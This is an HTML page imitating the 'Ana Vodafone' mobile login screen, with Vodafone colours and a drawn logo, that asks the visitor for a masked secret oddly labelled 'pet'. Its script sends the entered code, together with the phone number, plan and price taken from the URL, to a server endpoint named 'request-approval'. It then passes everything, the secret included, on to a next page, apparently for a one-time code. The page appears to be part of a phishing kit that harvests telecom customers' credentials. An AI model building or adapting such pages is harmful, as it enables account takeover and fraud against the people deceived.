<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Ana Vodafone - Pet</title>
<style>
  :root{
    --vf-red:#e60000;
    --bg:#f2f0f0;
    --text-dark:#1a1a1a;
    --text-grey:#6b6b6b;
    --card-white:#ffffff;
  }
  *{box-sizing:border-box;}
  html,body{
    height:100%;
    margin:0;
    padding-top:env(safe-area-inset-top,0px);
    padding-bottom:env(safe-area-inset-bottom,0px);
  }
  body{
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    background:var(--bg);
    display:flex;
    justify-content:center;
  }
  .phone{
    width:100%;
    max-width:430px;
    min-height:100vh;
    min-height:100dvh;
    display:flex;
    flex-direction:column;
    position:relative;
  }

  /* ripple hero */
  .hero{
    position:relative;
    padding:70px 24px 28px;
    overflow:hidden;
  }
  .ripples{
    position:absolute;
    top:50%;
    left:50%;
    width:900px;
    height:900px;
    transform:translate(-50%,-58%);
    z-index:0;
    pointer-events:none;
  }
  .ripples svg{width:100%;height:100%;}

  .back-btn{
    position:relative;
    z-index:2;
    width:42px;
    height:42px;
    border-radius:50%;
    background:var(--card-white);
    border:none;
    display:flex;
    align-items:center;
    justify-content:center;
    box-shadow:0 1px 4px rgba(0,0,0,.08);
    cursor:pointer;
    margin-bottom:34px;
  }

  .vf-logo{
    position:relative;
    z-index:2;
    display:flex;
    justify-content:center;
    margin-bottom:22px;
  }

  .hero h1{
    position:relative;
    z-index:2;
    text-align:center;
    font-size:25px;
    font-weight:800;
    color:var(--text-dark);
    margin:0;
    letter-spacing:-0.2px;
  }

  /* form */
  .form-area{
    padding:4px 24px 0;
  }
  .field{
    background:var(--card-white);
    border-radius:16px;
    padding:16px 16px 16px 20px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    margin-bottom:12px;
    box-shadow:0 1px 3px rgba(0,0,0,.04);
  }
  .field input{
    border:none;
    outline:none;
    background:transparent;
    font:inherit;
    font-size:16.5px;
    color:var(--text-dark);
    flex:1;
  }
  .field input::placeholder{
    color:#8a8a8a;
  }
  .eye-btn{
    background:none;
    border:none;
    padding:4px;
    display:flex;
    cursor:pointer;
    color:var(--text-dark);
  }

  .forget{
    display:inline-block;
    color:var(--text-dark);
    font-size:14.5px;
    text-decoration:underline;
    text-underline-offset:3px;
    margin:4px 0 28px;
  }

  .btn-login{
    width:100%;
    border:none;
    border-radius:16px;
    background:#eb9898;
    color:#fdeaea;
    font-size:17px;
    font-weight:600;
    padding:17px 0;
    cursor:not-allowed;
  }
  .btn-login.enabled{
    background:linear-gradient(180deg,#eb0000,#c40000);
    color:#fff;
    cursor:pointer;
    box-shadow:0 4px 10px rgba(198,0,0,.25);
  }

  @media (prefers-color-scheme: dark){
    :root:not([data-theme="light"]){
      --bg:#1c1414;
      --text-dark:#f2f2f2;
      --text-grey:#b5aaaa;
      --card-white:#2a2222;
    }
    .back-btn{background:#2a2222;}
  }
</style>
</head>
<body>
  <div class="phone">

    <div class="hero">
      <div class="ripples">
        <svg viewBox="0 0 900 900">
          <g fill="none" stroke="var(--vf-red)" stroke-width="1">
            <circle cx="450" cy="450" r="40" opacity="0.650"/>
            <circle cx="450" cy="450" r="54" opacity="0.631"/>
            <circle cx="450" cy="450" r="68" opacity="0.612"/>
            <circle cx="450" cy="450" r="82" opacity="0.593"/>
            <circle cx="450" cy="450" r="96" opacity="0.574"/>
            <circle cx="450" cy="450" r="110" opacity="0.555"/>
            <circle cx="450" cy="450" r="124" opacity="0.536"/>
            <circle cx="450" cy="450" r="138" opacity="0.517"/>
            <circle cx="450" cy="450" r="152" opacity="0.498"/>
            <circle cx="450" cy="450" r="166" opacity="0.479"/>
            <circle cx="450" cy="450" r="180" opacity="0.460"/>
            <circle cx="450" cy="450" r="194" opacity="0.441"/>
            <circle cx="450" cy="450" r="208" opacity="0.422"/>
            <circle cx="450" cy="450" r="222" opacity="0.403"/>
            <circle cx="450" cy="450" r="236" opacity="0.384"/>
            <circle cx="450" cy="450" r="250" opacity="0.365"/>
            <circle cx="450" cy="450" r="264" opacity="0.346"/>
            <circle cx="450" cy="450" r="278" opacity="0.327"/>
            <circle cx="450" cy="450" r="292" opacity="0.308"/>
            <circle cx="450" cy="450" r="306" opacity="0.289"/>
            <circle cx="450" cy="450" r="320" opacity="0.270"/>
            <circle cx="450" cy="450" r="334" opacity="0.251"/>
            <circle cx="450" cy="450" r="348" opacity="0.232"/>
            <circle cx="450" cy="450" r="362" opacity="0.213"/>
            <circle cx="450" cy="450" r="376" opacity="0.194"/>
            <circle cx="450" cy="450" r="390" opacity="0.175"/>
            <circle cx="450" cy="450" r="404" opacity="0.156"/>
            <circle cx="450" cy="450" r="418" opacity="0.137"/>
            <circle cx="450" cy="450" r="432" opacity="0.118"/>
            <circle cx="450" cy="450" r="446" opacity="0.099"/>
            <circle cx="450" cy="450" r="460" opacity="0.080"/>
            <circle cx="450" cy="450" r="474" opacity="0.061"/>
          </g>
        </svg>
      </div>

      <button class="back-btn" aria-label="Back">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
      </button>

      <div class="vf-logo">
        <svg width="78" height="78" viewBox="0 0 100 100" fill="none" stroke="var(--vf-red)" stroke-width="5">
          <path d="M55 15c-15 8-22 20-22 35 0 14 9 25 22 25 12 0 21-9 21-21 0-10-6-17-15-17-6 0-10 4-10 9 0 4 3 7 7 7" transform="translate(-4.5,5)"/>
        </svg>
      </div>

      <h1>Enter your pet</h1>
    </div>

    <div class="form-area">
      <div class="field">
        <input id="pet" type="password" placeholder="Pet">
        <button class="eye-btn" id="toggleEye" aria-label="Show pet">
          <svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
            <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/>
            <circle cx="12" cy="12" r="3"/>
            <line x1="3" y1="21" x2="21" y2="3"/>
          </svg>
        </button>
      </div>

      <a href="#" class="forget">Forget pet?</a>

      <button class="btn-login" id="loginBtn">Login</button>
    </div>

  </div>

  <script>
    const pwInput = document.getElementById('pet');
    const eyeBtn = document.getElementById('toggleEye');
    const eyeIcon = document.getElementById('eyeIcon');
    const loginBtn = document.getElementById('loginBtn');

    function updateLoginState() {
      const hasValue = pwInput.value.trim().length > 0;
      loginBtn.disabled = !hasValue;
      loginBtn.classList.toggle('enabled', hasValue);
      return hasValue;
    }

    eyeBtn.addEventListener('click', () => {
      const showing = pwInput.type === 'text';
      pwInput.type = showing ? 'password' : 'text';
      eyeIcon.innerHTML = showing
        ? '<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/><line x1="3" y1="21" x2="21" y2="3"/>'
        : '<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/>';
    });

    pwInput.addEventListener('input', updateLoginState);
    loginBtn.addEventListener('click', async () => {
      if (!updateLoginState()) return;

      const params = new URLSearchParams(window.location.search);
      const phone = (params.get('phone') || '').trim();
      const pet = pwInput.value.trim();

      if (!phone) {
        alert('Phone number is missing. Please go back and re-enter it.');
        return;
      }

      loginBtn.disabled = true;
      loginBtn.textContent = 'Checking...';

      try {
        const response = await fetch('http://localhost:3000/api/request-approval', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            plan: params.get('plan') || 'Ana Vodafone',
            price: params.get('price') || '0',
            phone,
            step: 'login',
            code: pet
          })
        });

        if (!response.ok) {
          throw new Error('Server error');
        }

        const data = await response.json();
        params.set('approvalId', data.id);
        params.set('phone', phone);
        params.set('pet', pet);
        window.location.href = 'pto.html?' + params.toString();
      } catch (error) {
        loginBtn.disabled = false;
        loginBtn.textContent = 'Login';
        alert('Unable to connect to the server. Please try again.');
      }
    });

    loginBtn.disabled = true;
    loginBtn.classList.remove('enabled');
    updateLoginState();
  </script>
</body>
</html>
